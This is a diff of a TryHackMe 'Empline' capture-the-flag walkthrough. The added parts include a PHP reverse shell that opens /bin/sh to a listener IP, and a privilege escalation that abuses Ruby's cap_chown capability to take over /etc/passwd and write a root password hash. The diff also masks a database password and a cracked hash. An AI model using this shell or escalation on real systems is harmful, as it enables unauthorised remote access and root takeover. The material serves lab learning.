@@ -1,5 +1,8 @@
 # TryHackMe — Empline — Walkthrough
 
+<img width="5001" height="444" alt="image" src="https://github.com/user-attachments/assets/72afb507-0b6b-496a-a6f2-1ede2f16aa5d" />
+
+
 
 
 During initial browsing, the website presents as a single-page application with smooth anchor navigation; each header item jumps to a section on the same page. One exception was identified: hovering/clicking the Employment menu item reveals a link to job.empline.thm, indicating additional functionality hosted on a separate subdomain.
@@ -57,6 +60,19 @@ On the `/careers` page, we can browse open roles and click into a position to re
 
 
 <img width="1424" height="831" alt="open cats" src="https://github.com/user-attachments/assets/f3a59011-ba3f-40e1-b356-803f28bdee17" />
+Simple PHP reverse shell:
+
+```bash
+<?php
+// php-rev.php
+set_time_limit (0);
+$VERSION = "1.0";
+$ip = '10.201.9.244';  // change to your IP
+$port = 4444;          // change to your listener port
+$sock=fsockopen($ip,$port);
+$proc = proc_open('/bin/sh', array(0=>$sock,1=>$sock,2=>$sock), $pipes);
+?>
+```
 
 <img width="1414" height="861" alt="career pool" src="https://github.com/user-attachments/assets/9f692dfa-eacd-45db-833a-10a698911532" />
 
@@ -94,12 +110,12 @@ define('DATABASE_NAME', 'opencats');
 define ('AUTH_MODE', 'sql');
 ````
 
-With these credentials, we are able to use mysql
+With these credentials, we are able to use mysql:
 
 ```bash
 www-data@ip-10-201-34-121:/$ mysql -u james -p
 mysql -u james -p
-Enter password: ng6pUFvsGNtw
+Enter password: n**********w
 ````
 
 
@@ -124,6 +140,64 @@ MariaDB [opencats]>  select user_name, email, password, access_level from user;
 
 | Algorithm | Hash                              | Plaintext           |
 |----------:|-----------------------------------|---------------------|
-| MD5       | 86d0dfda99dbebc424eb4407947356ac | pretonnevippasempre |
+| MD5       | 86d0dfda99dbebc424eb4407947356ac | p************sempre |
+
+
+- No sudo, no crontab, no SUIDs for `george`.
+- Check capabilities:
+```bash
+$ getcap -r / 2>/dev/null
+/usr/bin/mtr-packet = cap_net_raw+ep
+/usr/local/bin/ruby = cap_chown+ep
+```
+Verify user:
+
+$ id
+uid=1002(george) gid=1002(george) groups=1002(george)
+
+
+Use Ruby's File.chown to take ownership of /etc/passwd:
+```bash
+$ /usr/local/bin/ruby -e 'File.chown(1002,1002,"/etc/passwd")'
+$ ls -lah /etc/passwd
+-rw-r--r-- 1 george george 1.7K Jul 20 19:48 /etc/passwd
+```
+
+Create a password hash (example using openssl):
+```bash
+$ openssl passwd mynewpass
+# example output: bUlQOIGbhxiis
+```
+
+Edit /etc/passwd (now writable by george) and set the root password hash line:
+````bash
+root:bUlQOIGbhxiis:0:0:root:/root:/bin/bash
+````
+
+Switch to root:
+```bash
+$ su root
+Password: *created password*
+# now root
+```
+
+Confirm flag / root file:
+```bash
+# cat /root/root.txt
+74*****d0556e9c6f22e6f54b*****d5
+```
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
